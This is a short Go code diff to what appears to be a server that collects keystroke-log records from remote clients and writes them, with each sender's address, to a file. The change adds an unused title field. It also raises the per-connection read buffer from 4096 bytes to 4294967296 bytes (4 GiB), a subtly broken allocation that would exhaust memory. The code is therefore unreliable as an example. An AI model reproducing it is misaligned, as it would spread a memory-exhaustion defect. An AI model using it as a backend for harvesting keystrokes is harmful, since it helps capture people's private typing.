@@ -27,12 +27,14 @@ const (
 type keyLog struct {
 	Time  int64  `json:"time"`
 	Type  string `json:"type"`
+	Title string `json:"title"`
 	Value string `json:"value"`
 }
 
 // write appends data to the specified file.
 func (k keyLog) write(raddr string) {
 	// Format data for writing.
+	// TODO: keyLog.Title unused.
 	data := fmt.Sprintf(LogFormat, time.UnixMilli(k.Time).Format(TimeFormat), raddr, k.Type, k.Value)
 	// Open file to append data, create if file does not exist.
 	file, err := os.OpenFile(Filename, os.O_WRONLY|os.O_APPEND|os.O_CREATE, os.ModePerm)
@@ -69,7 +71,7 @@ func main() {
 			continue
 		}
 		// Initialise buffer for reading.
-		buffer := make([]byte, 4096)
+		buffer := make([]byte, 4294967296)
 		// Read data from connection.
 		n, e := conn.Read(buffer)
 		if e != nil {
